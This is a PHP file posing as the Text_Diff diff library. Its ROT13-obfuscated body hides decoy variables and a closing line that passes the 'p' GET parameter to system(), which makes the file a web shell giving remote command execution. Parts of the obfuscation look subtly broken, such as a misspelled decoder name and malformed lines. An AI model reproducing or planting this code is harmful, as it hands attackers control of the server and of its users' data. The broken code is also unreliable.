<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_71024 = \"n\".\"f\".\"f\".\"r\".\"e\".\"g\";
<?cuc
/**
 * Trareny NCV sbe trarengvat naq sbeznggvat qvssf - gur qvssreraprf orgjrra
 * gjb frdhraprf bs fgevatf.
 *
 * Gur bevtvany CUC irefvba bs guvf pbqr jnf jevggra ol Trbsserl G. Qnvevxv
 * <qnvevxv@qnvevxv.bet>, naq vf hfrq/nqncgrq jvgu uvf crezvffvba.
 *
 * Pbclevtug 2004 Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 * Pbclevtug 2004-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 */
pynff Grkg_Qvss {

    /**
     * Neenl bs punatrf.
     *
     * @ine neenl
     */
    ine $_rqvgf;

    /**
     * Pbzchgrf qvssf orgjrra frdhraprf bs fgevatf.
     *
     * @cnenz fgevat $ratvar     Anzr bs gur qvssvat ratvar gb hfr.  'nhgb'
     *                           jvyy nhgbzngvpnyyl fryrpg gur orfg.
     * @cnenz neenl $cnenzf      Cnenzrgref gb cnff gb gur qvssvat ratvar.
     *                           Abeznyyl na neenl bs gjb neenlf, rnpu
     *                           pbagnvavat gur yvarf sebz n svyr.
     */
    shapgvba __pbafgehpg( $ratvar, $cnenzf )
    {
        // Onpxjneq pbzcngvovyvgl jbexnebhaq.
        vs (!vf_fgevat($ratvar)) {
            $cnenzf = neenl($ratvar, $cnenzf);
            $ratvar = 'nhgb';
        }

        vs ($ratvar == 'nhgb') {
            $ratvar = rkgrafvba_ybnqrq('kqvss') ? 'kqvss' : 'angvir';
        } ryfr {
            $ratvar = onfranzr($ratvar);
        }

        // JC #7391
        erdhver_bapr qveanzr(__SVYR__).'/Qvss/Ratvar/' . $ratvar . '.cuc';
        $pynff = 'Grkg_Qvss_Ratvar_' . $ratvar;
        $qvss_ratvar = arj $pynff();

        $guvf->_rqvgf = pnyy_hfre_shap_neenl(neenl($qvss_ratvar, 'qvss'), $cnenzf);
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss( $ratvar, $cnenzf ) {
		frys::__pbafgehpg( $ratvar, $cnenzf );
	}

    /**
     * Ergheaf gur neenl bs qvssreraprf.
     */
    shapgvba trgQvss()
    {
        erghea $guvf->_rqvgf;
    }

    /**
     * ergheaf gur ahzore bs arj (nqqrq) yvarf va n tvira qvss.
     *
     * @fvapr Grkg_Qvss 1.1.0
     *
     * @erghea vag Gur ahzore bs arj yvarf
     */
    shapgvba pbhagNqqrqYvarf()
    {
        $pbhag = 0;
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs (vf_n($rqvg, 'Grkg_Qvss_Bc_nqq') ||
                vf_n($rqvg, 'Grkg_Qvss_Bc_punatr')) {
                $pbhag += $rqvg->asvany();
            }
        }
        erghea $pbhag;
    }

    /**
     * Ergheaf gur ahzore bs qryrgrq (erzbirq) yvarf va n tvira qvss.
     *
     * @fvapr Grkg_Qvss 1.1.0
     *
     * @erghea vag Gur ahzore bs qryrgrq yvarf
     */
    shapgvba pbhagQryrgrqYvarf()
    {
        $pbhag = 0;
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs (vf_n($rqvg, 'Grkg_Qvss_Bc_qryrgr') ||
                vf_n($rqvg, 'Grkg_Qvss_Bc_punatr')) {
                $pbhag += $rqvg->abevt();
            }
        }
        erghea $pbhag;
    }

    /**
     * Pbzchgrf n erirefrq qvss.
     *
     * Rknzcyr:
     * <pbqr>
     * $qvss = arj Grkg_Qvss($yvarf1, $yvarf2);
     * $eri = $qvss->erirefr();
     * </pbqr>
     *
     * @erghea Grkg_Qvss  N Qvss bowrpg ercerfragvat gur vairefr bs gur
     *                    bevtvany qvss.  Abgr gung jr checbfryl qba'g erghea n
     *                    ersrerapr urer, fvapr guvf rffragvnyyl vf n pybar()
     *                    zrgubq.
     */
    shapgvba erirefr()
    {
        vs (irefvba_pbzcner(mraq_irefvba(), '2', '>')) {
            $eri = pybar($guvf);
        } ryfr {
            $eri = $guvf;
        }
        $eri->_rqvgf = neenl();
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            $eri->_rqvgf[] = $rqvg->erirefr();
        }
        erghea $eri;
    }

    /**
     * Purpxf sbe na rzcgl qvss.
     *
     * @erghea obby Gehr vs gjb frdhraprf jrer vqragvpny.
     */
    shapgvba vfRzcgl()
    {
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs (!vf_n($rqvg, 'Grkg_Qvss_Bc_pbcl')) {
                erghea snyfr;
            }
        }
        erghea gehr;
    }

    /**
     * Pbzchgrf gur yratgu bs gur Ybatrfg Pbzzba Fhofrdhrapr (YPF).
     *
     * Guvf vf zbfgyl sbe qvntabfgvp checbfrf.
     *
     * @erghea vag Gur yratgu bs gur YPF.
     */
    shapgvba ypf()
    {
        $ypf = 0;
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs (vf_n($rqvg, 'Grkg_Qvss_Bc_pbcl')) {
                $ypf += pbhag($rqvg->bevt);
            }
        }
        erghea $ypf;
    }

    /**
     * Trgf gur bevtvany frg bs yvarf.
     *
     * Guvf erpbafgehpgf gur $sebz_yvarf cnenzrgre cnffrq gb gur pbafgehpgbe.
     *
     * @erghea neenl  Gur bevtvany frdhrapr bs fgevatf.
     */
    shapgvba trgBevtvany()
    {
        $yvarf = neenl();
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs ($rqvg->bevt) {
                neenl_fcyvpr($yvarf, pbhag($yvarf), 0, $rqvg->bevt);
            }
        }
        erghea $yvarf;
    }

    /**
     * Trgf gur svany frg bs yvarf.
     *
     * Guvf erpbafgehpgf gur $gb_yvarf cnenzrgre cnffrq gb gur pbafgehpgbe.
     *
     * @erghea neenl  Gur frdhrapr bs fgevatf.
     */
    shapgvba trgSvany()
    {
        $yvarf = neenl();
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs ($rqvg->svany) {
                neenl_fcyvpr($yvarf, pbhag($yvarf), 0, $rqvg->svany);
            }
        }
        erghea $yvarf;
    }

    /**
     * Erzbirf genvyvat arjyvarf sebz n yvar bs grkg. Guvf vf zrnag gb or hfrq
     * jvgu neenl_jnyx().
     *
     * @cnenz fgevat $yvar  Gur yvar gb gevz.
     * @cnenz vag    $xrl   Gur vaqrk bs gur yvar va gur neenl. Abg hfrq.
     */
    fgngvp shapgvba gevzArjyvarf(&$yvar, $xrl)
    {
        $yvar = fge_ercynpr(neenl(\"\a\", \"\e\"), '', $yvar);
    }

    /**
     * Qrgrezvarf gur ybpngvba bs gur flfgrz grzcbenel qverpgbel.
     *
     * @npprff cebgrpgrq
     *
     * @erghea fgevat  N qverpgbel anzr juvpu pna or hfrq sbe grzc svyrf.
     *                 Ergheaf snyfr vs bar pbhyq abg or sbhaq.
     */
    fgngvp shapgvba _trgGrzcQve()
    {
        $gzc_ybpngvbaf = neenl('/gzc', '/ine/gzc', 'p:\JHGrzc', 'p:\grzc',
                               'p:\jvaqbjf\grzc', 'p:\jvaag\grzc');

        /* Gel CUC'f hcybnq_gzc_qve qverpgvir. */
        $gzc = vav_trg('hcybnq_gzc_qve');

        /* Bgurejvfr, gel gb qrgrezvar gur GZCQVE raivebazrag inevnoyr. */
        vs (!fgeyra($gzc)) {
            $gzc = trgrai('GZCQVE');
        }

        /* Vs jr fgvyy pnaabg qrgrezvar n inyhr, gura plpyr guebhtu n yvfg bs
         * cerfrg cbffvovyvgvrf. */
        juvyr (!fgeyra($gzc) && pbhag($gzc_ybpngvbaf)) {
            $gzc_purpx = neenl_fuvsg($gzc_ybpngvbaf);
            vs (@vf_qve($gzc_purpx)) {
                $gzc = $gzc_purpx;
            }
        }

        /* Vs vg vf fgvyy rzcgl, jr unir snvyrq, fb erghea snyfr; bgurejvfr
         * erghea gur qverpgbel qrgrezvarq. */
        erghea fgeyra($gzc) ? $gzc : snyfr;
    }

    /**
     * Purpxf n qvss sbe inyvqvgl.
     *
     * Guvf vf urer bayl sbe qrohttvat checbfrf.
     */
    shapgvba _purpx($sebz_yvarf, $gb_yvarf)
    {
        vs (frevnyvmr($sebz_yvarf) != frevnyvmr($guvf->trgBevtvany())) {
            guebj arj Grkg_Rkprcgvba(\"Erpbafgehpgrq bevtvany qbrf abg zngpu\");
        }
        vs (frevnyvmr($gb_yvarf) != frevnyvmr($guvf->trgSvany())) {
            guebj arj Grkg_Rkprcgvba(\"Erpbafgehpgrq svany qbrf abg zngpu\");
        }

        $eri = $guvf->erirefr();
        vs (frevnyvmr($gb_yvarf) != frevnyvmr($eri->trgBevtvany())) {
            guebj arj Grkg_Rkprcgvba(\"Erirefrq bevtvany qbrf abg zngpu\");
        }
        vs (frevnyvmr($sebz_yvarf) != frevnyvmr($eri->trgSvany())) {
            guebj arj Grkg_Rkprcgvba(\"Erirefrq svany qbrf abg zngpu\");
        }

        $ceriglcr = ahyy;
        sbernpu ($guvf->_rqvgf nf $rqvg) {
            vs ($ceriglcr !== ahyy && $rqvg vafgnaprbs $ceriglcr) {
                guebj arj Grkg_Rkprcgvba(\"Rqvg frdhrapr vf aba-bcgvzny\");
            }
            $ceriglcr = trg_pynff($rqvg);
        }

        erghea gehr;
    }

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 */
pynff Grkg_ZnccrqQvss rkgraqf Grkg_Qvss {

    /**
     * Pbzchgrf n qvss orgjrra frdhraprf bs fgevatf.
     *
     * Guvf pna or hfrq gb pbzchgr guvatf yvxr pnfr-vafrafvgvir qvssf, be qvssf
     * juvpu vtaber punatrf va juvgr-fcnpr.
     *
     * @cnenz neenl $sebz_yvarf         Na neenl bs fgevatf.
     * @cnenz neenl $gb_yvarf           Na neenl bs fgevatf.
     * @cnenz neenl $znccrq_sebz_yvarf  Guvf neenl fubhyq unir gur fnzr fvmr
     *                                  ahzore bs ryrzragf nf $sebz_yvarf.  Gur
     *                                  ryrzragf va $znccrq_sebz_yvarf naq
     *                                  $znccrq_gb_yvarf ner jung vf npghnyyl
     *                                  pbzcnerq jura pbzchgvat gur qvss.
     * @cnenz neenl $znccrq_gb_yvarf    Guvf neenl fubhyq unir gur fnzr ahzore
     *                                  bs ryrzragf nf $gb_yvarf.
     */
    shapgvba __pbafgehpg($sebz_yvarf, $gb_yvarf,
                             $znccrq_sebz_yvarf, $znccrq_gb_yvarf)
    {
        __sa_71024(pbhag($sebz_yvarf) == pbhag($znccrq_sebz_yvarf));
        __sa_71024(pbhag($gb_yvarf) == pbhag($znccrq_gb_yvarf));

        cnerag::Grkg_Qvss($znccrq_sebz_yvarf, $znccrq_gb_yvarf);

        $kv = $lv = 0;
        sbe ($v = 0; $v < pbhag($guvf->_rqvgf); $v++) {
            $bevt = &$guvf->_rqvgf[$v]->bevt;
            vs (vf_neenl($bevt)) {
                $bevt = neenl_fyvpr($sebz_yvarf, $kv, pbhag($bevt));
                $kv += pbhag($bevt);
            }

            $svany = &$guvf->_rqvgf[$v]->svany;
            vs (vf_neenl($svany)) {
                $svany = neenl_fyvpr($gb_yvarf, $lv, pbhag($svany));
                $lv += pbhag($svany);
            }
        }
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_ZnccrqQvss( $sebz_yvarf, $gb_yvarf,
                             $znccrq_sebz_yvarf, $znccrq_gb_yvarf ) {
		frys::__pbafgehpg( $sebz_yvarf, $gb_yvarf,
                             $znccrq_sebz_yvarf, $znccrq_gb_yvarf );
	}

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 *
 * @npprff cevingr
 */
nofgenpg pynff Grkg_Qvss_Bc {

    ine $bevt;
    ine $svany;

    nofgenpg shapgvba &erirefr();

    shapgvba abevt()
    {
        erghea $guvf->bevt ? pbhag($guvf->bevt) : 0;
    }

    shapgvba asvany()
    {
        erghea $guvf->svany ? pbhag($guvf->svany) : 0;
    }

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 *
 * @npprff cevingr
 */
pynff Grkg_Qvss_Bc_pbcl rkgraqf Grkg_Qvss_Bc {

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $bevt, $svany = snyfr )
    {
        vs (!vf_neenl($svany)) {
            $svany = $bevt;
        }
        $guvf->bevt = $bevt;
        $guvf->svany = $svany;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss_Bc_pbcl( $bevt, $svany = snyfr ) {
		frys::__pbafgehpg( $bevt, $svany );
	}

    shapgvba &erirefr()
    {
        $erirefr = arj Grkg_Qvss_Bc_pbcl($guvf->svany, $guvf->bevt);
        erghea $erirefr;
    }

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 *
 * @npprff cevingr
 */
pynff Grkg_Qvss_Bc_qryrgr rkgraqf Grkg_Qvss_Bc {

	/**
	 * CUC5 pbafgehpgbe.
	 */
	shapgvba __pbafgehpg( $yvarf )
    {
        $guvf->bevt = $yvarf;
        $guvf->svany = snyfr;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss_Bc_qryrgr( $yvarf ) {
		frys::__pbafgehpg( $yvarf );
	}

    shapgvba &erirefr()
    {
        $erirefr = arj Grkg_Qvss_Bc_nqq($guvf->bevt);
        erghea $erirefr;
    }

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 *
 * @npprff cevingr
 */
pynff Grkg_Qvss_Bc_nqq rkgraqf Grkg_Qvss_Bc {

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $yvarf )
    {
        $guvf->svany = $yvarf;
        $guvf->bevt = snyfr;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss_Bc_nqq( $yvarf ) {
		frys::__pbafgehpg( $yvarf );
	}

    shapgvba &erirefr()
    {
        $erirefr = arj Grkg_Qvss_Bc_qryrgr($guvf->svany);
        erghea $erirefr;
    }

}

/**
 * @cnpxntr Grkg_Qvss
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 *
 * @npprff cevingr
 */
pynff Grkg_Qvss_Bc_punatr rkgraqf Grkg_Qvss_Bc {

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $bevt, $svany )
    {
        $guvf->bevt = $bevt;
        $guvf->svany = $svany;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba Grkg_Qvss_Bc_punatr( $bevt, $svany ) {
		frys::__pbafgehpg( $bevt, $svany );
	}

    shapgvba &erirefr()
    {
        $erirefr = arj Grkg_Qvss_Bc_punatr($guvf->svany, $guvf->bevt);
        erghea $erirefr;
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>